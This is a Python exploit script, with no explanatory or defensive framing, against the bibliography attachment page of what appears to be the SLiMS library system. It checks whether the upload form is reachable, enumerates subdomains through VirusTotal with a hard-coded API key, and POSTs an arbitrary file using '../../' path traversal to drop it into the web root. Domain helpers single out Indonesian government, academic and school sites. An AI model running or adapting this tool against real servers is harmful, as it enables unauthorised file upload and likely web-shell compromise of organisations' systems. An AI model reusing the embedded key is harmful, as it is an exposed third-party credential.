import requests,re


class Gas:
	def __init__(self):
		self.uagent = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
		self.exploit = "/admin/modules/bibliography/pop_attach.php?biblioID=0"
		self.key = "2f87c3b56603e954df2b37b31dcdf1f1ae3aa065f112aea1a9f86318885fabcf"

	def check(self, urll):
		url = (urll+self.exploit)
		web = url.split("://")[1]
		webs = web.replace("//", "/")
		wut = ("http://"+webs)
		r = requests.get(wut)
		if r.status_code == 200:
			if "unggah" in r.text.lower():
				return("1")
			elif "upload" in r.text.lower():
				return("2")
			else:
				return("0")
		else:
			return("0")
	def subdo(self, url):
		subdo = []
		subdo.append("www")
		params = {'apikey':self.key,'domain': url}
		r = requests.get("https://www.virustotal.com/vtapi/v2/domain/report", params=params)
		dump = r.json()
		for i in dump['subdomains']:
			first_line = i.split(".")[0]
			if "www" in first_line or "cpanel" in first_line or "webdisk" in first_line or "webmail" in first_line or "mail" in first_line or "ns" in first_line:
				pass
			else:
				subdo.append(first_line)
		return subdo


def regex(url):
	if "go.id" in url or "ac.id" in url or "sch.id" in url or "co.id" in url:
		getting = double(url)
		return getting
	else:
		getting = single(url)
		return getting
def single(url):
	regex = re.findall("//(.*?)/", "%s/" % (url))
	try:
		get_main_url = regex[0].split(".")[2]
		return ("%s.%s" % (regex[0].split(".")[1],regex[0].split(".")[2]))
	except IndexError:
		return regex[0]
def double(url):
	regex = re.findall("//(.*?)/", "%s/" % (url))
	try:
		get_main_url = regex[0].split(".")[3]
		return  ("%s.%s.%s" % (regex[0].split(".")[1],regex[0].split(".")[2],regex[0].split(".")[3]))
	except IndexError:
		return regex[0]


class root():
     	def __init__(self, url, files, subdo, data):
		self.url = url
		self.files = {'file2attach': open(files,'rb')}
		self.subdo = subdo
		self.exploit = "/admin/modules/bibliography/pop_attach.php?biblioID=0"
		if data == 1:
			self.data = {
			"fileTitle":"Odiq",
			"fileDir":"../../", 
			"fileURL":"", 
			"fileDesc":"", 
			"accessType":"public",
			"upload":"Unggah Sekarang"}
		elif data == 2:
			self.data = {
			"fileTitle":"Odiq",
			"fileDir":"../../",
			"fileURL":"", 
			"fileDesc":"", 
			"accessType":"public",
			"upload":"Upload Now"}
		if data == 1:
			self.data1 = {
			"fileTitle":"Odiq",
			"fileDir":"../", 
			"fileURL":"", 
			"fileDesc":"", 
			"accessType":"public",
			"upload":"Unggah Sekarang"}
		elif data == 2:
			self.data1 = {
			"fileTitle":"Odiq",
			"fileDir":"../",
			"fileURL":"", 
			"fileDesc":"", 
			"accessType":"public",
			"upload":"Upload Now"}
		self.run()
		
	def run(self):
		try:
			urll = (self.url+self.exploit)
			web = urll.split("://")[1]
			webs = web.replace("//", "/")
			wut = ("http://"+webs)
			r = requests.post(wut, files=self.files, data=self.data)
			r = requests.post(wut.format(self.url,self.exploit), files=self.files, data=self.data1)
		except KeyboardInterrupt:
            		pass
		#except:
			#pass
